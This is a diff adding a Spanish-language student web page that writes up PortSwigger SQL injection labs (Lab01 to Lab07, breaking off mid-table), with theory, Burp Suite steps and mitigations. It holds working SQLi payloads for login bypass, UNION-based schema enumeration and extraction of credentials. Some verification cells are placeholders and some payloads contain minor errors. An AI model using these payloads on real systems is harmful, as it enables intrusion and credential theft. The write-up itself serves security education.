@@ -1,0 +1,1821 @@
+---
+import Header from "../components/Header.astro";
+import Project from "../components/ComponentActividades.astro";
+import Sidebar from "../components/Sidebar.astro";
+const projects = [
+  {
+    title: "Parcial 1",
+    desc: [
+      "Actividades introductorias a la seguridad informática"
+    ],
+    tech: ["Entrar a Parcial 1 "]
+  }
+];
+---
+
+<!DOCTYPE html>
+<html
+>
+  <Header title="Actividad 8 - Parcial 2 - 181760" />
+
+  <body>
+    <div class="content">
+        <Sidebar selectedItem="PF01" />
+      <nav class="main">
+        <div class="container">
+          <div class="back-nav-container">
+            <a href="/" class="back-nav-button w-inline-block"
+              ><img src="/assets/back.svg" loading="lazy" alt="" class="back-nav-img" />
+              <div>Back</div></a
+            >
+          </div>
+          <div class="content-container">
+            <h1 style="font-size: 40px;">Actividad 8: ROAD TO HALL OF FAME
+              (SQL INJECTION).</h1>
+            <a href="/assets/documentos/act01-Equipo01.pdf" download class="btn-descarga">
+              Exportar a PDF
+            </a>
+
+            <div class="content-container">
+
+              <div class="titulo-separador"></div>
+
+              <div class="content-container">
+                <h4>Introducción Contextual</h4>
+                  <div>
+                    <p>La Inyección SQL (SQLi) se mantiene como una de las vulnerabilidades más persistentes y peligrosas desde hace más de dos décadas. Esta vulnerabilidad permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos, lo que puede resultar en el acceso no autorizado a datos sensibles, la modificación de registros e incluso la toma total del control del servidor de base de datos.</p>
+                    <p>El presente documento tiene como objetivo documentar de manera técnica y estructurada la resolución de diversos escenarios de vulnerabilidad SQLi, utilizando los laboratorios oficiales de PortSwigger (Web Security Academy). A través del uso de herramientas de interceptación profesional como Burp Suite, se analizarán diferentes vectores de ataque, desde los más directos (In-band) hasta técnicas avanzadas de inferencia (Blind) y fuera de banda (Out-of-band).
+                    </p>
+                  </div>
+              </div>
+
+              <div class="titulo-separador"></div>    
+
+              <div class="content-container">
+                <h4>Marco teórico</h4>
+                  <h5>Funcionamiento de bases de datos relacionales</h5>
+                  <p>Las bases de datos relacionales (RDBMS) organizan los datos en tablas con filas y columnas, relacionadas entre sí mediante claves. Las aplicaciones web suelen interactuar con estas bases de datos para almacenar y recuperar información dinámica (usuarios, productos, configuraciones). El motor de la base de datos interpreta las instrucciones enviadas por la aplicación para ejecutar operaciones CRUD (Create, Read, Update, Delete).</p>
+                  <h5>Consultas SQL básicas</h5>
+                  <p>SQL (Structured Query Language) es el lenguaje estándar para la gestión de estas bases de datos. Para entender SQLi, es fundamental comprender comandos clave:</p>
+                  <ul class="lista">
+                    <li>SELECT: Utilizado para recuperar datos de una o más tablas.</li>
+                    <li>WHERE: Cláusula de filtrado que condiciona qué registros se ven afectados</li>
+                    <li>UNION: Operador que permite combinar los resultados de dos o más sentencias SELECT en un solo conjunto de resultados. Es la base de los ataques Union-based.</li>
+                    <li>Comentarios: Dependiendo del motor (MySQL: -- o #, PostgreSQL: --, Oracle: --), sirven para anular el resto de una consulta legítima.</li>
+                  </ul>
+                  <h5>¿Qué es SQL Injection?</h5>
+                  <p>La Inyección SQL es una vulnerabilidad de seguridad web que ocurre cuando una aplicación permite que datos proporcionados por el usuario (entradas en formularios, parámetros URL, cookies) se concatenen directamente en una consulta SQL sin la debida validación o parametrización.
+                  Esto permite a un atacante "inyectar" comandos SQL propios que alteran la lógica original de la consulta programada por el desarrollador.</p>
+                  <h5>Clasificación de ataques SQLi</h5>
+
+                  <h5>Impacto en la Tríada CIA</h5>
+                  <ul class="lista">
+                    <li>Confidencialidad: Es el impacto más frecuente. Los atacantes pueden extraer información privada (contraseñas, datos bancarios, datos de clientes).</li>
+                    <li>Integridad: Un atacante puede usar comandos como UPDATE, INSERT o DELETE para corromper la información, alterar precios de productos o cambiar permisos de usuarios.</li>
+                    <li>Disponibilidad: Mediante el borrado de tablas o el consumo excesivo de recursos (ataques de denegación de servicio a nivel de BD), el atacante puede hacer que la aplicación sea inoperable.</li>
+                  </ul>
+
+                  <h5>Relación con OWASP Top 10</h5>
+                  <p>La Inyección SQL forma parte de la categoría A03:2021 – Injection (tercer lugar del top), la cual ocupa históricamente los primeros lugares en el ranking de riesgos de seguridad en aplicaciones web debido a su alta prevalencia y severidad de impacto, aunque esta amenaza bajo de ranking respecto a años pasados, sigue siendo un riesgo de seguridad de alto impacto.</p>
+
+                  <h5>Importancia en pruebas de penetración</h5>
+                  <p>En un Pentest, la detección de SQLi es una prioridad crítica. Representa una "victoria total" potencial, ya que suele ser la puerta de entrada para el compromiso total de la infraestructura, el movimiento lateral y el robo de propiedad intelectual.</p>
+
+                  <h5>Tipos de Payloads</h5>
+                  <p>Los payloads son fragmentos de código malicioso diseñados para explotar la vulnerabilidad. Ejemplos comunes:</p>
+                  <ul class="lista">
+                    <li>' OR 1=1--: Para saltar autenticaciones.</li>
+                    <li>' UNION SELECT username, password FROM users--: Para extraer credenciales.</li>
+                    <li>'; IF (1=1) WAITFOR DELAY '0:0:10'--: Para probar inyecciones ciegas por tiempo en SQL Server.</li>
+                  </ul>
+
+                  <h5>Principios de defensa</h5>
+                  <p>La prevención eficaz se basa en:</p>
+                  <ul>
+                    <ol class="lista">
+                      <li>Sentencias Preparadas (Consultas Parametrizadas): Es la defensa principal. Separa el código SQL de los datos proporcionados por el usuario.</li>
+                      <li>Validación de Entradas (Lista Blanca): Permitir solo caracteres y formatos conocidos y esperados.</li>
+                      <li>Principio de Menor Privilegio: Configurar la cuenta de la base de datos que usa la aplicación web con los permisos mínimos necesarios (no usar 'sa' o 'root').</li>
+                      <li>Uso de Procedimientos Almacenados: Siempre que se implementen de forma segura (sin concatenación interna).</li>
+                    </ol>
+                  </ul>
+              </div>
+              
+              <div class="titulo-separador"></div>
+
+              <div class="content-container">
+                <h4>Laboratorios</h4>
+                  <p>Acontinuación una serie de laboratorios controlados provistos por la plataforma Web Security Academy de PortSwigger, donde mediante el uso de Burp Suite como herramienta de interceptación y manipulación de tráfico, se aplicará una metodología centrada en la identificación de puntos de inyección, el análisis de las respuestas del servidor y el despliegue de payloads específicos para validar vulnerabilidades de tipo In-band, Blind y Out-of-band.</p>
+                  <div class="indice">
+                    <h5 id="indice">Índice</h5>
+                    <ul>
+                      <li><a href="#tabla1">Lab01</a></li>
+                      <li><a href="#tabla2">Lab02</a></li>
+                      <li><a href="#tabla3">Lab03</a></li>
+                      <li><a href="#tabla4">Lab04</a></li>
+                      <li><a href="#tabla5">Lab05</a></li>
+                      <li><a href="#tabla6">Lab06</a></li>
+                      <li><a href="#tabla7">Lab07</a></li>
+                      <li><a href="#tabla8">Lab08</a></li>
+                      <li><a href="#tabla9">Lab09</a></li>
+                      <li><a href="#tabla10">Lab10</a></li>
+                      <li><a href="#tabla11">Lab11</a></li>
+                      <li><a href="#tabla12">Lab12</a></li>
+                      <li><a href="#tabla13">Lab13</a></li>
+                      <li><a href="#tabla14">Lab14</a></li>
+                      <li><a href="#tabla15">Lab15</a></li>
+                      <li><a href="#tabla16">Lab16</a></li>
+                      <li><a href="#tabla17">Lab17</a></li>
+                      <li><a href="#tabla18">Lab18</a></li>
+                    </ul>
+                  </div>
+                  
+
+                  <table class="cronologia" id="tabla1">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab01: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Apprentice (Aprendiz)</td>
+                      <td>SQLi clásica en la cláusula WHERE (Manipulación de lógica booleana).</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Modificar la consulta SQL para que la aplicación muestre todos los productos de una categoría específica, incluyendo aquellos que aún no han sido lanzados (released = 0).</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>La vulnerabilidad ocurre porque la aplicación concatena directamente la entrada del usuario (el nombre de la categoría) en una consulta SQL sin sanitizarla ni usar consultas preparadas.</p>
+                        <p>La consulta original es:
+                        SELECT * FROM products WHERE category = '[CATEGORÍA]' AND released = 1</p>
+                        <p>Al no haber validación, un atacante puede cerrar la comilla simple del string de la categoría y añadir operadores lógicos (OR) que alteren la condición de la cláusula WHERE, haciendo que siempre devuelva "verdadero" (TRUE) y comentando el resto de la consulta original.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Acceder al laboratorio e interactuar con el filtro al seleccionar cualquier categoría de la lista (por ejemplo, "Gifts").
+                          </li>
+                          <li>
+                            Abrir Burp Suite, asegúrandose de que el Proxy esté activado e interceptar la petición que se ve así: GET /filter?category=Gifts
+                          </li>
+                          <li>
+                            Modificar el parámetro que Envía la petición al Repeater, cambiando el valor de category (Gifts), por el payload: ' OR 1=1--
+                          </li>
+                          <li>
+                            Al Enviar y verificar, se observará que la respuesta HTTP 200 contiene muchos más productos de los que se veían originalmente, comprobándose al actualizarse la página.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' OR 1=1--
+                        <ul>
+                          <li>' (Comilla simple): Rompe la cadena de texto (string) original en la consulta SQL.</li>
+                          <li>OR 1=1: Es una condición que siempre es verdadera. Como se usa el operador OR, no importa si la categoría existe o si released es 1; basta con que $1=1$ sea cierto para que la base de datos devuelva todas las filas.</li>
+                          <li>-- (Guion guion): Es el carácter de comentario en SQL (específicamente para bases de datos como PostgreSQL o MySQL). Esto hace que el resto de la consulta original (' AND released = 1) sea ignorado por el motor de base de datos.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>La forma más efectiva de prevenir este ataque es dejar de concatenar strings y utilizar Consultas Preparadas (Parameterized Queries).</p>
+                        <p>En lugar de construir la query manualmente, se define una estructura fija: SELECT * FROM products WHERE category = ? AND released = 1</p>
+                        <p>El valor del usuario se pasa como un parámetro aislado, lo que impide que el motor de base de datos interprete caracteres especiales como ' o -- como parte de la lógica de ejecución.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla2">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab02: SQL injection vulnerability allowing login bypass</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Apprentice (Aprendiz)</td>
+                      <td>SQLi en formulario de autenticación (Bypass de Login).</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Acceder a la aplicación como el usuario administrator sin conocer su contraseña, manipulando la consulta de inicio de sesión.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El formulario de login toma el nombre de usuario y la contraseña para construir una consulta similar a esta:
+                          SELECT * FROM users WHERE username = '[USUARIO]' AND password = '[PASSWORD]''
+                          Si el atacante ingresa un payload que cierre la comilla del usuario y comente el resto de la consulta, el motor de base de datos solo validará que el usuario exista, ignorando por completo la validación de la contraseña.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Acceder al laboratorio, ya en la página ingresar al menú de login (esquina superior derecha “My account”)
+                          </li>
+                          <li>
+                            Abrir Burp Suite, activar Proxy e interceptar la petición que se ve así: GET / -…academy.net/login
+                          </li>
+                          <li>
+                            Nuevamente en el menú de login, intentar un ingreso con el user: administrator, interceptándose en Burp, pero ahora el método POST
+                          </li>
+                          <li>
+                            Modificar el Payload en el Repeater, busca el cuerpo de la petición (donde dice username=administrator&password=1234), cambiándolo por: username=administrator'--&password=1234
+                          </li>
+                          <li>
+                            Al enviarse, se obtendrá la respuesta 302 Found (redirección), logueadose como administrador, esto comprobándose de misma manera en la página
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: administrator'--
+                        <ul>
+                          <li>administrator: Es el nombre de la cuenta objetivo.</li>
+                          <li>(Comilla): Cierra el campo del nombre de usuario en la consulta SQL.</li>
+                          <li>(Comentario): Hace que todo lo que sigue (AND password = '...') sea ignorado.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Consultas Preparadas (Bind Variables): Nunca concatenar directamente la entrada del usuario en la query.</p>
+                        <p>Hashing de contraseñas: Aunque no previene la SQLi, es vital que las contraseñas no se manejen en texto plano.</p>
+                        <p>Manejo de errores genérico: No indicar si el error fue en el "usuario" o la "contraseña" para no dar pistas al atacante.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla3">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab03: SQL injection attack, querying the database type and version on Oracle</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>UNION-based SQLi (Inyección basada en el operador UNION para enumeración de base de datos).</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Utilizar un ataque de inyección SQL para recuperar la versión de la base de datos de Oracle.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>La vulnerabilidad reside en el filtro de categoría. Al usar UNION, podemos "pegar" los resultados de una segunda consulta a la consulta original. </p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Determinar el número de columnas al  interceptar la petición de una categoría (en este caso Accessories) en el Proxy, enviandola al Repeater y probando payloads de UNION SELECT (' UNION SELECT NULL, NULL FROM DUAL--) hasta que la página cargue normalmente
+                          </li>
+                          <li>
+                            Verificar qué columna acepta texto, reemplazando los NULL por strings: ' UNION SELECT 'abc', 'def' FROM DUAL--. Si esto funciona, ambas columnas aceptan texto.
+                          </li>
+                          <li>
+                            Extraer la versión, inyectando la consulta real para Oracle (Payload: ' UNION SELECT banner, NULL FROM v$version--), donde El campo banner en la tabla v$version contiene la información de la versión
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' UNION SELECT banner, NULL FROM v$version--
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>UNION SELECT: Combina los resultados de la consulta legítima con los de nuestra consulta maliciosa.</li>
+                          <li>banner: Es el nombre de la columna en Oracle que almacena la descripción de la versión.</li>
+                          <li>NULL: Se usa para completar el número de columnas requerido (ya que la consulta original tiene 2 columnas, nuestra unión debe tener 2).</li>
+                          <li>FROM v$version: Tabla del sistema en Oracle que contiene la información de versión.</li>
+                          <li>--: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Implementar Consultas Preparadas (Parameterized Queries): Esta es la defensa principal. Al usar parámetros, los comandos SQL inyectados se tratan como simples datos de texto y no como código ejecutable.</p>
+                        <p>Principio de Menor Privilegio: La cuenta de base de datos que usa la aplicación web no debería tener permisos para leer tablas del sistema como v$version a menos que sea estrictamente necesario.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla4">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab04: SQL injection attack, querying the database type and version on MySQL and Microsoft</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection basado en UNION</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mostrar la cadena con la versión de la base de datos para resolver el laboratorio</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El filtro de categoría de productos es vulnerable a inyecciones SQL. La aplicación no valida ni maneja la entrada del usuario en el parámetro category, lo que permite al atacante modificar la consulta SQL original </p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Se inicia Burp Suite y se da en intercept on en la pestaña proxy y se manda a repeater
+                            El primer paso para un ataque UNION es saber cuántas columnas devuelve la consulta original. Utilizamos category, en especifico Accesories. Se incluye' UNION SELECT NULL-- . Si da error, se añade otro NULL: 'UNION SELECT NULL,NULL-- . Al cargar la página sabemos que existen dos columnas.
+                          </li>
+                          <li>
+                            Se usa el query '+UNION+SELECT+'abc','def'# para confirmar que podemos observar resultados 
+                          </li>
+                          <li>
+                            Finalmente usamos el query '+UNION+SELECT+@@version,+NULL# para que se muestre la versión
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: '+UNION+SELECT+'abc','def'#
+                        UNION	SELECT: Operador que combina resultados de dos consultas. Requisitos:
+                        <ul>
+                          <li>Mismo número de columnas (ya descubrimos que son 2)</li>
+                          <li>Tipos de datos compatibles (por eso probamos con texto)</li>
+                          'abc', 'def': Son cadenas de texto literales. Las usamos porque:
+                          <li>Si la columna acepta texto, veremos 'abc' o 'def' en la respuesta</li>
+                          <li>Nos indica qué posición de columna se muestra en la página</li>
+                          <li>Confirmamos que podemos inyectar datos alfanumérico</li>
+                        </ul>
+                        Payload 2'+UNION+SELECT+@@version,+NULL# 
+                        <ul>
+                          <li>Una vez confirmadas las columnas de texto, sustituimos las cadenas de prueba por la variable que realmente nos interesa y hace que aparezca la versión  "8.0.27-0ubuntu0.20.04.1"</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Validación de entrada: Permitir solo caracteres esperados</p>
+                        <p>Ocultar errores de BD: No mostrar detalles de errores al usuario</p>
+                        <p>Mínimos privilegios: Cuenta BD con permisos estrictamente necesarios</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla5">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab05:SQL injection attack, listing the database contents on non-Oracle databases</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection basado en UNION</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Enumerar las tablas de la base de datos, identificar la tabla que contiene las credenciales de usuario, extraer los nombres de usuario y contraseñas, y finalmente iniciar sesión como usuario administrator.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El filtro de categoría de productos es vulnerable a inyecciones SQL. La aplicación no valida la entrada del usuario en el parámetro category y, además, devuelve los resultados de la consulta en la respuesta, lo que permite realizar ataques UNION</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Comprobamos que sean dos columnas  apoyandonos de la vulnerabilidad de categoría,  usando ‘UNION+SELECT+’abc’,’def’--, al obtener respuesta sabemos que existen dos columnas y que nos responde por aquí
+                          </li>
+                          <li>
+                            Utilizamos  ‘UNION+SELECT+table_name,+NULL+FROM+information_schema.tables-- para conocer los nombres de las tablas existentes.
+                          </li>
+                          <li>
+                            Encontramos el nombre de la tabla qué contiene los usuarios y ahora usamos ‘UNION+SELECT+column_name,+WHERE+table_name=’users_taavzn’-- para encontrar el usuario y la contraseña
+                          </li>
+                          <li>
+                            Introducimos el query ‘UNION+SELECT+username_clxteu,+password_xixovp+FROM+users_taavzn—
+                          </li>
+                          <li>
+                            Encontramos las credenciales del administrador y ahora podemos usarlas.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Payload 1: '+UNION+SELECT+'abc','def'--</p>
+                        <ul>
+                          <li>Se utiliza para saber si las dos columnas existentes son vulnerables</li>
+                        </ul>
+                        <p>Payload 2: +UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</p>
+                        <ul>
+                          <li>Se utiliza para encontrar el nombre de las tablas existentes en las bases de datos</li>
+                        </ul>
+                        <p>Payload 3:'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</p>
+                        <ul>
+                          <li>Sirve para conocer el usuario y la contraseña con ayuda del nombre de la tabla</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Validación de entrada: Permitir solo caracteres esperados</p>
+                        <p>Principio de mínimo privilegio</p>
+                        <p>Gestión segura de errores. NO mostrar errores detallados de BD al usuario. Mostrar mensaje genérico y guardar detalles en logs internos.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla6">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab06:SQL injection attack, listing the database contents on Oracle</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection basado en UNION</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Enumerar las tablas de la base de datos Oracle, identificar la tabla que contiene las credenciales de usuario, extraer los nombres de usuario y contraseñas, y finalmente iniciar sesión como usuario administrator</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Enumerar las tablas de la base de datos Oracle, identificar la tabla que contiene las credenciales de usuario, extraer los nombres de usuario y contraseñas, y finalmente iniciar sesión como usuario administrador</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Se inicia Burp Suite y se da en intercept on en la pestaña proxy y se manda a repeater, usaremos category en Accesories, '+UNION+SELECT+'abc','def'+FROM+dual-- se agrega dual para qué funcione en ORACLE
+                          </li>
+                          <li>
+                            +UNION+SELECT+table_name,NULL+FROM+all_tables-- ahora usamos este query para conocer el nombre de la tabla de los usuarios, encontramos el nombre 
+                          </li>
+                          <li>
+                            , ahora usamos el siguiente query para conseguir el username y la contraseña '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+                          </li>
+                          <li>
+                            Conseguimos los siguientes resultados 
+                          </li>
+                          <li>
+                            Finalmente utilizamos el query cambiando por los campos qué ya conocemos para entrar a conocer las credenciales de administrador '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--  
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>Payload 1:'+UNION+SELECT+'abc','def'+FROM+dual--</p>
+                        <ul>
+                          <li>En ORACLE es necesario una tabla y en esté caso la tabla dual es una tabla dummy, el abc y def son usados para conocer las columnas existentes</li>
+                        </ul>
+                        <p>Payload 2: '+UNION+SELECT+table_name,NULL+FROM+all_tables--</p>
+                        <ul>
+                          <li>Con esté payload se buscan los nombres de las tablas</li>
+                        </ul>
+                        <p>Payload 3:+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--</p>
+                        <ul>
+                          <li>En este query se va a buscar el usuario y contraseña para en el siguiente query buscar las credenciales de administrador</li>
+                        </ul>
+                          Payload 4: '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+                          <ul>
+                            <li>Se busca la información sensible entre estos las credenciales de administrador</li>
+                          </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
+                        <p>Validación de entrada. Permitir solo valores esperados. </p>
+                        <p>Principio de mínimo privilegio</p>
+                        <p>Gestión segura de errores. NO mostrar errores detallados de BD al usuario. Mostrar mensaje genérico y guardar detalles en logs internos.</p>
+                      </td>
+                    </tr>                    
+                    </tbody>
+                  </table>
+                  <a href="#indice" class="indice">Volver al índice</a>
+
+                  <table class="cronologia" id="tabla7">
+                    <thead>
+                      <tr>
+                        <th colspan="2">Lab07: SQL injection UNION attack, determining the number of columns returned by the query</th>
+                      </tr>
+                    </thead>
+                    <tbody>
+                    <tr>
+                      <th>Nivel</th>
+                      <th>Tipo de SQLi</th>
+                    </tr>
+                    <tr>
+                      <td>Practitioner</td>
+                      <td>SQL Injection UNION-based</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Objetivos</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Descubrir cuántas columnas devuelve la consulta original, porque el UNION solo funciona si ambas consultas tienen el mismo número y tipo de columnas.</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Vulnerabilidad</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <p>El filtro de categorías de productos no valida ni sanitiza correctamente la entrada del usuario antes de construir la consulta SQL.</p>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">
+                        Procedimiento
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        <ol>
+                          <li>
+                            Entrar a una categoría en la página e interceptar la request
+                          </li>
+                          <li>
+                            Cambiamos el valor de category a ’+UNION+SELECT+NULL—-‘, primeramente nos marcará error.
+                          </li>
+                          <li>
+                            Iremos agregando más +NULL, hasta que coincida con los números de columnas.
+                          </li>
+                        </ol>
+                      </td>
+                    </tr>  
+                    <tr>
+                      <td colspan="2">Verificación</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">XD</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Explicación del payload</td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">
+                        El payload utilizado es: ' UNION SELECT NULL,NULL--
+                        <ul>
+                          <li>': Cierra la cadena de la categoría original.</li>
+                          <li>UNION SELECT: Combina los resultados de la consulta legítima con los de nuestra consulta maliciosa.</li>
+                          <li>NULL,NULL: Cada NULL representa una columna ficticia. Se usan porque son valores “universales” que no generan conflictos de tipo</li>
+                          <li>NULL: Se usa para completar el número de columnas requerido (ya que la consulta original tiene 2 columnas, nuestra unión debe tener 2).</li>
+                          <li>--: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
+                        </ul>
+                      </td>
+                    </tr>
+                    <tr>
+                      <td colspan="2">Mitigación recomendada</td>
+                    </tr>                
+                    <tr>
+                      <td colspan="2">
